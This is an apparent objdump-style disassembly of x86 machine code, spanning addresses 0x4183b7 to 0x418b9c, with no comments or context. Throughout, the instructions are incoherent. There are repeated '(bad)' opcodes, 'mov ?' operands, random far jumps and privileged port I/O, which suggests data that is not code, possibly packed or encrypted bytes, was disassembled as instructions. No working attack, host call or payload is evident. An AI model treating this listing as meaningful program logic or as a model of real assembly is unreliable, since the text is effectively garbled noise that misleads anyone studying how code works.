  4183b7:	mov    DWORD PTR [eax+0x69051d3b],ebp
  4183bd:	ret    0xae5e
  4183c0:	ret    0xac27
  4183c3:	mov    WORD PTR [ebp+esi*4+0x20b80b13],ds
  4183ca:	xor    ebp,DWORD PTR [eax]
  4183cc:	neg    BYTE PTR [edx+0x3c]
  4183cf:	mov    esi,0x16df1790
  4183d4:	imul   esi,ebx,0x28
  4183d7:	cld    
  4183d8:	pop    edi
  4183d9:	push   esp
  4183da:	fs out dx,al
  4183dc:	xchg   esp,eax
  4183dd:	ja     0x4183b9
  4183df:	imul   eax,ecx,0x497d0051
  4183e5:	cwde   
  4183e6:	test   BYTE PTR [ebx+0x19],dh
  4183e9:	pop    esi
  4183ea:	adc    edx,DWORD PTR [edi-0x5e]
  4183ed:	popa   
  4183ee:	inc    ecx
  4183ef:	xor    ecx,eax
  4183f1:	sbb    al,0xb5
  4183f3:	les    ebp,FWORD PTR [ebp-0x3f965ad0]
  4183f9:	mov    ah,0x5e
  4183fb:	cmp    eax,0xae86fd97
  418400:	xor    DWORD PTR ss:[eax-0x5ab156b2],0x2f
  418408:	(bad)  
  418409:	mov    ds:0xbd45685a,eax
  41840e:	push   esp
  41840f:	in     eax,dx
  418410:	xchg   ebx,eax
  418411:	fbstp  TBYTE PTR [ebp+ebx*8+0x12]
  418415:	test   al,0xa9
  418417:	call   0xf957e3f8
  41841c:	jb     0x418414
  41841e:	fbld   TBYTE PTR [ebx+0x21f0134d]
  418424:	outs   dx,BYTE PTR ds:[esi]
  418425:	and    bh,cl
  418427:	jmp    0x1098:0xbb1ea2b7
  41842e:	(bad)  
  41842f:	mov    al,0x9f
  418431:	xchg   esi,eax
  418432:	sbb    DWORD PTR [eax],eax
  418434:	dec    edx
  418435:	out    0x11,eax
  418437:	and    dl,cl
  418439:	sub    ebp,DWORD PTR [ecx+esi*1+0xf5d7982]
  418440:	scas   al,BYTE PTR es:[edi]
  418441:	stos   BYTE PTR es:[edi],al
  418442:	imul   eax,DWORD PTR [ecx],0x37
  418445:	jnp    0x4183ed
  418447:	std    
  418448:	push   0xffffff9e
  41844a:	mov    edi,ebp
  41844c:	fbld   TBYTE PTR [esi+0x11]
  41844f:	xchg   esi,eax
  418450:	ins    BYTE PTR es:[edi],dx
  418451:	neg    BYTE PTR [esp+ebp*8]
  418454:	mov    dl,0xf2
  418456:	mov    WORD PTR [eax],fs
  418458:	enter  0x763b,0x90
  41845c:	cmp    eax,0x1e281ee8
  418461:	sub    BYTE PTR [ecx-0x71],0xd4
  418465:	and    BYTE PTR [eax+edx*4-0x65d126cd],ch
  41846c:	xchg   esp,eax
  41846d:	pop    es
  41846e:	(bad)  
  418470:	dec    esp
  418471:	(bad)  
  418472:	scas   al,BYTE PTR es:[edi]
  418473:	mov    ah,0x38
  418475:	lock pop ecx
  418477:	mov    edx,0x10d6d4e0
  41847c:	cs mov ecx,0xba4ceda4
  418482:	lock lea esi,gs:[edx]
  418486:	das    
  418487:	in     al,0xd8
  418489:	push   ds
  41848a:	cmp    DWORD PTR [esi],ecx
  41848c:	loopne 0x4184a7
  41848e:	push   0x91c1a4b8
  418493:	lods   al,BYTE PTR ds:[esi]
  418494:	sti    
  418495:	(bad)  
  418496:	pop    ebx
  418497:	aas    
  418498:	xor    esp,DWORD PTR [edx-0x51]
  41849b:	int3   
  41849c:	dec    ebp
  41849d:	test   eax,0x89692666
  4184a2:	sbb    eax,0x89ebfc37
  4184a7:	cmp    eax,0xbe3c3c0f
  4184ac:	mov    ebx,0xbda4565e
  4184b1:	mov    esp,DWORD PTR [edi+ebp*8-0x53]
  4184b5:	mov    eax,ds:0x6deaa431
  4184ba:	and    ebx,DWORD PTR [ecx+0x19dfc881]
  4184c0:	jp     0x418501
  4184c2:	or     al,0x6a
  4184c4:	popa   
  4184c5:	lock popa 
  4184c7:	arpl   si,dx
  4184c9:	es ss dec ecx
  4184cc:	pop    esp
  4184cd:	xchg   edi,eax
  4184ce:	mov    eax,ds:0xc546e623
  4184d3:	push   ecx
  4184d4:	sbb    cl,BYTE PTR [edx-0x471c71d9]
  4184da:	je     0x4184c1
  4184dc:	icebp  
  4184dd:	btr    DWORD PTR [edx-0x7dcbd1ff],edx
  4184e4:	(bad)  
  4184e6:	je     0x418543
  4184e8:	pop    esp
  4184e9:	jge    0x418474
  4184eb:	lods   eax,DWORD PTR ds:[esi]
  4184ec:	jmp    0x1b0e:0x7e6461c5
  4184f3:	push   ds
  4184f4:	xor    BYTE PTR [eax-0x78],bh
  4184f7:	(bad)  
  4184f8:	int3   
  4184f9:	dec    esp
  4184fa:	inc    ecx
  4184fb:	mov    WORD PTR [eax+0x1229ef2d],gs
  418501:	push   0xa3851f0c
  418506:	cmp    ecx,DWORD PTR [esi-0x1e593468]
  41850c:	xchg   esp,eax
  41850d:	add    DWORD PTR [esi-0x39580a92],0xcd92c059
  418517:	sub    DWORD PTR [eax+eiz*4+0x78],ebx
  41851b:	mov    edi,0xb500f972
  418520:	and    BYTE PTR [ecx-0x24215b7e],ah
  418526:	ins    BYTE PTR es:[edi],dx
  418527:	retf   
  418528:	or     eax,0x8695e5e1
  41852d:	and    BYTE PTR [ebp-0xd],bl
  418530:	xor    ch,bl
  418532:	mov    al,0x52
  418534:	jmp    0x2b40:0xe887f202
  41853b:	retf   0x6ab8
  41853e:	push   edi
  41853f:	les    eax,FWORD PTR [edx]
  418541:	sbb    ecx,ebp
  418543:	scas   eax,DWORD PTR es:[edi]
  418544:	jmp    0xb9e7:0x83a8e5ae
  41854b:	fcmovne st,st(5)
  41854d:	daa    
  41854e:	push   edi
  41854f:	(bad)  
  418550:	in     eax,dx
  418551:	sahf   
  418552:	xor    dl,BYTE PTR [edi+0x77]
  418555:	mov    ecx,0x2e580981
  41855a:	sub    cl,BYTE PTR [ebp-0x1d]
  41855d:	aas    
  41855e:	xchg   BYTE PTR [eax],al
  418560:	jge    0x41859a
  418562:	shl    BYTE PTR [eax],1
  418564:	xchg   BYTE PTR [eax-0x67],dl
  418567:	(bad)  
  418568:	xor    BYTE PTR [edi+0x35ea81b6],dl
  41856e:	outs   dx,DWORD PTR ds:[esi]
  41856f:	sub    al,0xdf
  418571:	xor    ah,BYTE PTR [ecx-0x50]
  418574:	lahf   
  418575:	cmp    BYTE PTR [ebx-0x25],dl
  418578:	push   esi
  418579:	jb     0x418576
  41857b:	gs dec eax
  41857d:	mov    cl,0x84
  41857f:	or     BYTE PTR [eax],ah
  418581:	in     eax,dx
  418582:	shl    DWORD PTR [ebx+0x7c68062a],0x47
  418589:	sub    edi,eax
  41858b:	mov    esi,0xa62f9b26
  418590:	and    esp,DWORD PTR [esi+0x50]
  418593:	jae    0x41860f
  418595:	jmp    0x7fe8bab4
  41859a:	(bad)
  41859f:	jb     0x418553
  4185a1:	call   0xa412:0xcbc01333
  4185a8:	inc    eax
  4185a9:	mov    ch,0xe8
  4185ab:	jmp    0x2956602
  4185b0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4185b1:	pop    ebx
  4185b2:	jo     0x41860d
  4185b4:	sbb    bh,BYTE PTR [ebx+0x1d3c34a3]
  4185ba:	push   ebx
  4185bb:	std    
  4185bc:	mov    cl,0x14
  4185be:	xlat   BYTE PTR ds:[ebx]
  4185bf:	int3   
  4185c0:	neg    BYTE PTR [edi+edi*8]
  4185c3:	push   0x7c44903a
  4185c8:	mov    ?,WORD PTR [edi]
  4185ca:	ins    DWORD PTR es:[edi],dx
  4185cb:	not    DWORD PTR [edi]
  4185cd:	mov    eax,ds:0x633dcc50
  4185d2:	sbb    bh,BYTE PTR [ecx+ebx*8]
  4185d5:	(bad)  
  4185d6:	or     ecx,ecx
  4185d8:	mov    al,ds:0x2875c60d
  4185dd:	push   ecx
  4185de:	push   edx
  4185df:	das    
  4185e0:	iret   
  4185e1:	add    eax,0x7e0d5db1
  4185e6:	inc    ebp
  4185e7:	arpl   WORD PTR [ebx],ax
  4185e9:	es aad 0x5b
  4185ec:	mov    DWORD PTR [esi],esi
  4185ee:	or     eax,0x1187e0c5
  4185f3:	mov    ch,0xfc
  4185f5:	sub    ebp,DWORD PTR [ebp+0x56654aa]
  4185fb:	and    eax,0xed9b237c
  418600:	into   
  418601:	mov    esi,0xcfb50eb0
  418606:	int3   
  418607:	pop    ecx
  418608:	jmp    0x283c:0xa12d4e25
  41860f:	dec    esp
  418610:	out    0x5,eax
  418612:	jne    0x4185e5
  418614:	mov    dh,dl
  418616:	pop    ds
  418617:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418618:	xor    eax,0xe0339c57
  41861d:	ss add al,0x71
  418620:	lds    ebx,FWORD PTR [ecx]
  418622:	pop    esp
  418623:	(bad)  
  418624:	and    DWORD PTR [ebx+0x78e58932],ebp
  41862a:	pusha  
  41862b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41862c:	add    al,ah
  41862e:	addr16 mov esp,0x8f301a36
  418634:	stc    
  418635:	sub    al,0x76
  418637:	push   eax
  418638:	adc    al,0xed
  41863a:	ss aad 0x2e
  41863d:	and    dh,dh
  41863f:	mov    bh,0xf9
  418641:	push   edx
  418642:	test   DWORD PTR [bx],0xd488e5d7
  418649:	daa    
  41864a:	mov    edx,0xe271949d
  41864f:	cdq    
  418650:	aas    
  418651:	adc    al,0x75
  418653:	push   0x9731da70
  418658:	mov    eax,0x7fa9ec9a
  41865d:	mov    ebp,0x23eab45d
  418662:	dec    edi
  418663:	es xor bl,cl
  418666:	push   eax
  418667:	jg     0x418628
  418669:	ficomp WORD PTR [edx]
  41866b:	mov    al,ds:0xf623bbcf
  418670:	sahf   
  418671:	cmp    al,0x58
  418673:	jno    0x4186d5
  418675:	add    BYTE PTR [edx],0x36
  418678:	mov    dl,0xe3
  41867a:	aas    
  41867b:	push   ecx
  41867c:	sar    BYTE PTR [esi+eiz*4+0x39],0xf9
  418681:	jmp    0x3a9f:0xb698e432
  418688:	nop
  418689:	sub    edi,DWORD PTR [eax]
  41868b:	enter  0xe36e,0x3f
  41868f:	(bad)  
  418690:	frndint 
  418692:	lods   al,BYTE PTR ds:[esi]
  418693:	lock push es
  418695:	cmp    al,0xf9
  418697:	or     esi,DWORD PTR [ecx]
  418699:	mov    dl,0x1a
  41869b:	adc    edx,edi
  41869d:	ins    DWORD PTR es:[edi],dx
  41869e:	mov    cl,ah
  4186a0:	test   BYTE PTR [edx+0x200b3de5],ah
  4186a6:	shl    BYTE PTR [esi+0x77],0x8d
  4186aa:	pcmpeqw mm3,QWORD PTR [edi]
  4186ad:	push   0xfffffff4
  4186af:	xchg   edi,eax
  4186b0:	xchg   ecx,eax
  4186b1:	jb     0x418731
  4186b3:	mov    dl,0xad
  4186b5:	or     dh,BYTE PTR [eax-0x39]
  4186b8:	lahf   
  4186b9:	jmp    0x2fc6:0x5094416c
  4186c0:	or     ah,cl
  4186c2:	cmp    DWORD PTR [edi-0x25a3894],0x6b
  4186c9:	lahf   
  4186ca:	jecxz  0x4186df
  4186cc:	sub    bl,BYTE PTR [esi]
  4186ce:	push   0x2afa5e35
  4186d3:	push   cs
  4186d4:	inc    esi
  4186d5:	push   edi
  4186d6:	sub    BYTE PTR [esi],ch
  4186d8:	fistp  WORD PTR [ebx+0x1c]
  4186db:	push   ebx
  4186dc:	inc    ebp
  4186dd:	in     eax,0x4a
  4186df:	mov    WORD PTR ds:0x171c136,cs
  4186e5:	fidiv  DWORD PTR [edi+0x7b]
  4186e8:	and    al,0xb3
  4186ea:	jp     0x4186a1
  4186ec:	and    ebp,esi
  4186ee:	daa    
  4186ef:	push   eax
  4186f0:	aaa    
  4186f1:	jo     0x41871e
  4186f3:	inc    edi
  4186f4:	mov    ch,0x30
  4186f6:	push   cs
  4186f7:	lea    edx,[ecx-0x1fdeeb85]
  4186fd:	movhps QWORD PTR cs:[ecx-0x5a],xmm0
  418702:	jae    0x41870f
  418704:	clc    
  418705:	iret   
  418706:	cs push esp
  418708:	lods   eax,DWORD PTR ds:[esi]
  418709:	xchg   ebp,eax
  41870a:	fs or  eax,0x1e6c592b
  418710:	mov    esi,0xcd40e743
  418715:	jl     0x418708
  418717:	sub    BYTE PTR [edx],0x4a
  41871a:	pop    edi
  41871b:	imul   esp,DWORD PTR [eax],0xffffffdf
  41871e:	retf   
  41871f:	mov    esp,0xdb096e85
  418724:	pop    es
  418725:	xlat   BYTE PTR ds:[ebx]
  418726:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418727:	test   eax,0xff3ae2cc
  41872c:	mul    BYTE PTR [esi+0x2baacfad]
  418732:	loop   0x418700
  418734:	in     al,0x9b
  418736:	stos   BYTE PTR es:[edi],al
  418737:	mov    eax,DWORD PTR [esi]
  418739:	push   eax
  41873a:	sbb    edi,DWORD PTR [esi-0x77]
  41873d:	jle    0x41872b
  41873f:	or     edx,DWORD PTR [eax+eax*8+0x6bbb4e0a]
  418746:	lahf   
  418747:	xor    cl,BYTE PTR [ebx-0x7d]
  41874a:	pop    ds
  41874b:	pop    esi
  41874d:	jbe    0x41872f
  41874f:	cs cdq 
  418751:	jmp    0x4187b3
  418753:	mov    edi,0xeb6e3cf6
  418758:	mov    ebx,0x89208448
  41875d:	ret    
  41875e:	sub    eax,0xc6830f5d
  418763:	mov    eax,ds:0x62fcbb9e
  418768:	mov    ds:0xff4da0a9,eax
  41876d:	aas    
  41876e:	inc    esp
  41876f:	sbb    eax,0x55bf2af4
  418774:	fdivr  QWORD PTR [eax+edx*1-0x7eadf4]
  41877b:	ret    
  41877c:	mov    edx,esp
  41877e:	push   edx
  41877f:	test   BYTE PTR [ebx-0x9],ch
  418782:	rep ins DWORD PTR es:[edi],dx
  418784:	aaa    
  418785:	call   0x765abf4
  41878a:	sub    edx,DWORD PTR [esi]
  41878c:	in     eax,0x62
  41878e:	out    0x34,eax
  418790:	inc    ecx
  418791:	push   ds
  418792:	jge    0x41874f
  418794:	lock jne 0x418761
  418797:	out    dx,al
  418798:	nop
  418799:	enter  0x7d85,0xf1
  41879d:	ret    
  41879e:	ds ins DWORD PTR es:[edi],dx
  4187a0:	adc    DWORD PTR [ecx],ecx
  4187a2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4187a3:	fist   WORD PTR [ecx+0x635384]
  4187a9:	test   BYTE PTR [edx+0x7a77dd11],dh
  4187af:	scas   al,BYTE PTR es:[edi]
  4187b0:	jp     0x41873b
  4187b2:	xchg   ecx,eax
  4187b3:	sbb    dh,BYTE PTR [ebx+ebx*8]
  4187b6:	jg     0x41880e
  4187b8:	mov    BYTE PTR [edx-0xdbbc1e3],0x80
  4187bf:	sub    esp,DWORD PTR [eax-0x56b42f1d]
  4187c5:	scas   al,BYTE PTR es:[edi]
  4187c6:	lock push ebp
  4187c8:	pop    es
  4187c9:	aaa    
  4187ca:	in     eax,dx
  4187cb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4187cd:	inc    ebp
  4187ce:	xor    esi,DWORD PTR [ebx+0x6b]
  4187d1:	xor    eax,0x85e4cc0d
  4187d6:	cld    
  4187d7:	and    ah,cl
  4187d9:	fsub   DWORD PTR [ebp-0x25]
  4187dc:	mov    dh,0x74
  4187de:	in     eax,dx
  4187df:	out    dx,eax
  4187e0:	xchg   esi,eax
  4187e1:	das    
  4187e2:	or     esi,esp
  4187e4:	add    eax,0x267f2f69
  4187e9:	sub    BYTE PTR [esi+esi*1],0xb5
  4187ed:	mov    DWORD PTR [esi],esp
  4187ef:	jmp    0xad746d04
  4187f4:	fsubrp st(6),st
  4187f6:	fwait
  4187f7:	lods   eax,DWORD PTR ds:[esi]
  4187f8:	shr    BYTE PTR [ebx+0x2c],1
  4187fb:	pop    esi
  4187fc:	dec    esi
  4187fd:	cmp    DWORD PTR [edx],esi
  4187ff:	pop    ebx
  418800:	(bad)  
  418802:	push   0xb261551b
  418807:	sub    eax,0x1dba2a8
  41880c:	cs xor al,0x39
  41880f:	xor    dl,BYTE PTR [ebp+0x2e]
  418812:	mov    ah,0xe5
  418814:	cmp    DWORD PTR [ecx-0xa],0x4a
  418818:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418819:	jae    0x4187bd
  41881b:	cli    
  41881c:	scas   al,BYTE PTR es:[edi]
  41881d:	out    dx,al
  41881e:	fucom  st(4)
  418820:	not    dh
  418822:	mov    WORD PTR [edi+0x58fb951b],cs
  418828:	cli    
  418829:	lahf   
  41882a:	inc    esp
  41882b:	mov    esi,0xdf399cc
  418830:	push   eax
  418831:	cmc    
  418832:	pop    esp
  418833:	das    
  418834:	mov    al,0xdb
  418836:	sub    BYTE PTR [edx+edx*4],cl
  418839:	inc    edi
  41883a:	push   esp
  41883b:	cmc    
  41883c:	add    ah,BYTE PTR [edx+0x0]
  41883f:	fisubr WORD PTR ds:0x8032401a
  418845:	scas   eax,DWORD PTR es:[edi]
  418846:	cld    
  418847:	cmp    DWORD PTR [ecx],edi
  418849:	mov    ch,0x39
  41884b:	mov    sp,0x72f8
  41884f:	mov    esi,eax
  418851:	mov    eax,0xbe060b9a
  418856:	pop    esi
  418857:	inc    ebp
  418858:	mul    BYTE PTR [edi+0x76112788]
  41885e:	in     eax,0xd6
  418860:	mov    ah,0xda
  418862:	push   esi
  418863:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418864:	test   eax,0xa290ff27
  418869:	jo     0x4187f5
  41886b:	and    esi,edi
  41886d:	pop    ss
  41886e:	inc    esp
  41886f:	sub    ebx,ebp
  418871:	inc    esp
  418872:	(bad)  
  418873:	out    dx,eax
  418874:	add    eax,0xffb25a62
  418879:	inc    esi
  41887a:	out    0xc9,al
  41887c:	xor    bl,BYTE PTR [edx-0x67]
  41887f:	push   ds
  418880:	sahf   
  418881:	rcr    ch,0xd5
  418884:	int    0xbf
  418886:	adc    BYTE PTR [esi],ah
  418888:	es pop ebx
  41888a:	push   ss
  41888b:	loopne 0x418861
  41888d:	adc    DWORD PTR [ecx+0x51],0x9
  418891:	xor    DWORD PTR [edi+0x2ece86db],0xe
  418898:	es fs adc al,0x68
  41889c:	and    BYTE PTR [esi-0x73f77e0a],ah
  4188a2:	add    dl,BYTE PTR [eax]
  4188a4:	dec    esp
  4188a5:	mov    ebx,0x99d5aa99
  4188aa:	xchg   esp,eax
  4188ab:	outs   dx,BYTE PTR ds:[esi]
  4188ac:	pop    eax
  4188ad:	mov    ds:0x39b2c2b2,al
  4188b2:	(bad)  
  4188b3:	mov    dh,0x3d
  4188b5:	push   0x9488f4df
  4188ba:	push   0xb051bb0d
  4188bf:	mov    bl,0xdd
  4188c1:	loopne 0x4188e9
  4188c3:	adc    cl,bl
  4188c5:	outs   dx,DWORD PTR ds:[esi]
  4188c6:	shl    BYTE PTR [edx+0x3a3261af],1
  4188cc:	mov    edi,0x88092c71
  4188d1:	sbb    BYTE PTR ds:0xaf150516,bl
  4188d7:	jb     0x41890e
  4188d9:	cmp    BYTE PTR [esi+0x2c],cl
  4188dc:	cli    
  4188dd:	add    ebp,edi
  4188df:	push   0x8
  4188e1:	xor    BYTE PTR [ecx-0x48],dh
  4188e4:	pop    ecx
  4188e5:	mov    bh,0xa1
  4188e7:	pushf  
  4188e8:	pop    ebp
  4188e9:	jecxz  0x4188dc
  4188eb:	pop    esi
  4188ec:	or     ebp,edx
  4188ee:	push   edx
  4188ef:	hlt    
  4188f0:	inc    esi
  4188f1:	loope  0x4188ef
  4188f3:	push   cs
  4188f4:	xor    eax,0xa905c4f7
  4188f9:	mov    al,0x6d
  4188fb:	out    dx,al
  4188fc:	jg     0x418932
  4188fe:	retf   
  4188ff:	repz mov eax,ds:0x620d313f
  418905:	push   ss
  418906:	xchg   ebp,eax
  418907:	daa    
  418908:	push   0x46
  41890a:	psubb  mm7,QWORD PTR [ecx-0x71]
  41890e:	call   0x17a526fd
  418913:	mov    bl,0x4f
  418915:	sbb    BYTE PTR [ecx],cl
  418917:	or     eax,0x101f6b18
  41891c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41891d:	cmp    eax,0x488b2ac0
  418922:	sub    DWORD PTR [edi],esi
  418924:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418925:	pop    eax
  418926:	scas   al,BYTE PTR es:[edi]
  418927:	cmp    dh,ah
  418929:	sub    al,0x94
  41892b:	ins    DWORD PTR es:[edi],dx
  41892c:	in     al,dx
  41892d:	popf   
  41892e:	loopne 0x4189ae
  418930:	and    al,0x91
  418932:	cmp    bh,BYTE PTR [esi+0x46b12bbb]
  418938:	push   ebp
  418939:	std    
  41893a:	into   
  41893b:	arpl   WORD PTR [ebp+0x4a0293b2],bp
  418941:	imul   cl
  418943:	push   edi
  418944:	scas   eax,DWORD PTR es:[edi]
  418945:	and    eax,0xde9ae475
  41894a:	dec    edx
  41894b:	jae    0x4189ad
  41894d:	pop    ebx
  41894e:	add    dh,ch
  418950:	mov    al,0xf7
  418952:	cmp    al,0xfb
  418954:	mov    ?,WORD PTR [esi*4-0x327acee5]
  41895b:	arpl   WORD PTR [ecx],sp
  41895d:	xlat   BYTE PTR ds:[ebx]
  41895e:	xchg   edi,eax
  41895f:	mov    bh,0x67
  418961:	imul   esp,ecx,0xfffffff0
  418964:	xchg   ebx,eax
  418965:	test   BYTE PTR [ebp-0x4ecdd321],ah
  41896b:	icebp  
  41896c:	push   0x59
  41896e:	add    BYTE PTR [ebp+0xc],bl
  418971:	cmc    
  418972:	out    0x17,eax
  418974:	mov    edx,DWORD PTR [esp+eiz*2+0x6d]
  418978:	mov    ds:0x34af47d2,al
  41897d:	mov    DWORD PTR [esi+0x33],ecx
  418980:	stos   BYTE PTR es:[edi],al
  418981:	mov    eax,ds:0xc6a75011
  418986:	or     eax,0xfb59bfa3
  41898b:	jnp    0x4189a0
  41898d:	scas   al,BYTE PTR es:[edi]
  41898e:	lods   al,BYTE PTR ds:[esi]
  41898f:	inc    esp
  418990:	fdivr  DWORD PTR [ebx]
  418992:	and    edi,esi
  418994:	test   BYTE PTR [ebx-0x6f],bl
  418997:	int3   
  418998:	out    dx,al
  418999:	in     al,0xca
  41899b:	imul   edi,DWORD PTR [esp+edx*4-0x7c],0xffffffda
  4189a0:	pop    esi
  4189a1:	mov    eax,ds:0xb24940b2
  4189a6:	jg     0x4189bc
  4189a8:	in     al,0xc5
  4189aa:	adc    eax,0x8a569729
  4189af:	out    dx,eax
  4189b0:	or     al,0xc3
  4189b2:	pop    ss
  4189b3:	cmp    esp,DWORD PTR [ecx-0x35c28dc7]
  4189b9:	in     eax,dx
  4189ba:	inc    edi
  4189bb:	pop    ds
  4189bc:	push   eax
  4189bd:	and    ebx,DWORD PTR [eax]
  4189bf:	xchg   BYTE PTR [edi-0x80],bh
  4189c2:	(bad)  
  4189c4:	xchg   edx,eax
  4189c5:	inc    eax
  4189c6:	ret    
  4189c7:	mov    edi,0x7d95b85d
  4189cc:	lock daa 
  4189ce:	jne    0x4189b1
  4189d0:	xchg   edi,eax
  4189d1:	pop    ecx
  4189d2:	and    eax,0x8160671f
  4189d7:	in     eax,dx
  4189d8:	sbb    ebx,ebp
  4189da:	inc    DWORD PTR [bx+di+0x4c1c]
  4189df:	cmp    esp,DWORD PTR [esp+eiz*4]
  4189e2:	mov    DWORD PTR [ebx-0x3b2dbc07],esi
  4189e8:	fucomi st,st(0)
  4189ea:	clc    
  4189eb:	jb     0x418a48
  4189ed:	test   eax,0xc366d66c
  4189f2:	pop    ds
  4189f3:	test   bh,dl
  4189f5:	xchg   edi,eax
  4189f6:	ret    
  4189f7:	mov    ds:0xdccd4430,eax
  4189fc:	rol    BYTE PTR [edx+0x541ca7a9],0x5c
  418a03:	fild   WORD PTR [edi+0x6a]
  418a06:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418a07:	sbb    ebp,edx
  418a09:	cs push esp
  418a0b:	lds    esi,FWORD PTR [ecx*4+0x6aa20991]
  418a12:	push   ebx
  418a13:	(bad)  
  418a15:	dec    ecx
  418a16:	cli    
  418a17:	clc    
  418a18:	push   ebp
  418a19:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418a1a:	xchg   ebx,eax
  418a1b:	jge    0x4189e3
  418a1d:	js     0x4189c7
  418a1f:	(bad)  [ebp-0x35]
  418a22:	xchg   edi,eax
  418a23:	jg     0x4189ea
  418a25:	sub    ebp,edi
  418a27:	iret   
  418a28:	mov    ds:0xdc09baea,eax
  418a2d:	shr    esp,1
  418a2f:	out    dx,eax
  418a30:	ja     0x418a6f
  418a32:	jb     0x418a29
  418a34:	ret    
  418a35:	es ja  0x418a1b
  418a38:	int3   
  418a39:	fcom   DWORD PTR fs:[eax-0x4a5fe421]
  418a40:	adc    dl,al
  418a42:	dec    esi
  418a43:	or     bh,BYTE PTR [eax+0x4d58a4a9]
  418a49:	fsubr  st,st(6)
  418a4b:	shl    esi,1
  418a4d:	lahf   
  418a4e:	or     eax,0x122a02e7
  418a53:	out    dx,eax
  418a54:	mov    al,0xdf
  418a56:	pop    esi
  418a57:	pusha  
  418a58:	sbb    eax,0x8e0768d
  418a5d:	add    eax,0x552977f1
  418a62:	push   edi
  418a63:	jnp    0x418a14
  418a65:	mov    ds:0xa6273c89,al
  418a6a:	pop    eax
  418a6b:	inc    ecx
  418a6c:	sbb    edx,DWORD PTR [esi]
  418a6e:	inc    ecx
  418a6f:	imul   ecx,DWORD PTR [esi],0x7a
  418a72:	aad    0x67
  418a74:	jae    0x418a55
  418a76:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418a77:	aam    0xaa
  418a79:	rcl    DWORD PTR [ecx-0x75d65281],1
  418a7f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418a80:	(bad)  
  418a81:	pop    esi
  418a82:	mov    ah,0x81
  418a84:	(bad)  
  418a85:	mov    bl,0x94
  418a87:	jae    0x418a50
  418a89:	das    
  418a8a:	leave  
  418a8b:	fwait
  418a8c:	pop    ss
  418a8d:	cs std 
  418a8f:	inc    esp
  418a90:	inc    ecx
  418a91:	enter  0x7e24,0x45
  418a95:	dec    eax
  418a96:	mov    ecx,0x4c0804fc
  418a9b:	mov    BYTE PTR [eax],ch
  418a9d:	mov    ebx,0xf081bceb
  418aa2:	mov    ebp,0x3e4286bd
  418aa7:	mov    ?,ebx
  418aa9:	mov    al,0xf5
  418aab:	in     al,0x19
  418aad:	jmp    0x1be:0x8fb5c855
  418ab4:	popf   
  418ab5:	inc    ecx
  418ab6:	jno    0x418a38
  418ab8:	push   0xffffff84
  418aba:	fadd   DWORD PTR [eax+eax*2]
  418abd:	inc    edx
  418abe:	jl     0x418b2f
  418ac0:	repz pop ecx
  418ac2:	pop    esi
  418ac3:	jp     0x418a9c
  418ac5:	mov    edi,0x41a4d1fb
  418aca:	jbe    0x418aab
  418acc:	repz push ss
  418ace:	sbb    esp,DWORD PTR [eax]
  418ad0:	mov    ah,0xf6
  418ad2:	clc    
  418ad3:	into   
  418ad4:	mov    ss,WORD PTR [edx]
  418ad6:	xor    edx,DWORD PTR ds:0xeeaeddc4
  418adc:	div    BYTE PTR [ebp-0x7cf5e371]
  418ae2:	repnz inc ecx
  418ae4:	in     al,0x28
  418ae6:	out    dx,al
  418ae7:	js     0x418b32
  418ae9:	pop    eax
  418aea:	iret   
  418aeb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418aec:	leave  
  418aed:	cwde   
  418aee:	leave  
  418aef:	mov    ds:0x99262787,al
  418af4:	mov    dl,0xb2
  418af6:	sbb    ebx,0x4
  418af9:	fst    QWORD PTR gs:[edi]
  418afc:	fnstsw WORD PTR [eax]
  418afe:	jmp    0x9f78:0xd61fbe29
  418b05:	int    0x55
  418b07:	xlat   BYTE PTR ds:[ebx]
  418b08:	(bad)  
  418b0a:	adc    BYTE PTR [ecx-0x3c17852d],dl
  418b10:	ds call 0x5f58:0xccbe640a
  418b18:	lods   eax,DWORD PTR ds:[esi]
  418b19:	test   eax,0xfadd15f7
  418b1e:	inc    edx
  418b1f:	fisttp QWORD PTR [edx-0x5f]
  418b22:	icebp  
  418b23:	inc    ebx
  418b24:	push   0x6215267a
  418b29:	mov    WORD PTR [esi],?
  418b2b:	daa    
  418b2c:	ret    
  418b2d:	ins    DWORD PTR es:[edi],dx
  418b2e:	ret    
  418b2f:	cli    
  418b30:	mov    dl,0x1
  418b32:	loopne 0x418b54
  418b34:	addr16 inc eax
  418b36:	ja     0x418b81
  418b38:	pop    ebx
  418b39:	push   eax
  418b3a:	(bad)
  418b3d:	jge    0x418b41
  418b3f:	fdiv   DWORD PTR [ecx-0x7a968a70]
  418b45:	fst    DWORD PTR [eax+edi*2]
  418b48:	adc    DWORD PTR [edx-0x7ceaa3b4],ebp
  418b4e:	adc    eax,0x36c255a3
  418b53:	xlat   BYTE PTR ds:[ebx]
  418b54:	ins    DWORD PTR es:[edi],dx
  418b55:	call   0xc834:0x933b8305
  418b5c:	adc    al,0x61
  418b5e:	fimul  WORD PTR [edi-0x73]
  418b61:	loop   0x418b1b
  418b63:	dec    ebp
  418b64:	lock int 0x74
  418b67:	push   es
  418b68:	xor    BYTE PTR [ebp-0x752df79c],0x26
  418b6f:	inc    ecx
  418b70:	es call 0x7e1fef6a
  418b76:	pop    ss
  418b77:	mov    ebx,0xcc4071f
  418b7c:	mov    ah,0x19
  418b7e:	ds mov esi,fs
  418b81:	mov    esp,0x3b684375
  418b86:	mov    ch,0x93
  418b88:	hlt    
  418b89:	mov    edx,0x7d90dbae
  418b8e:	adc    eax,DWORD PTR [edi+eiz*1]
  418b91:	popf   
  418b92:	mov    bh,0x26
  418b94:	jae    0x418b46
  418b96:	jp     0x418b34
  418b98:	jne    0x418b79
  418b9a:	int    0x4c
  418b9c:	pop    ebp
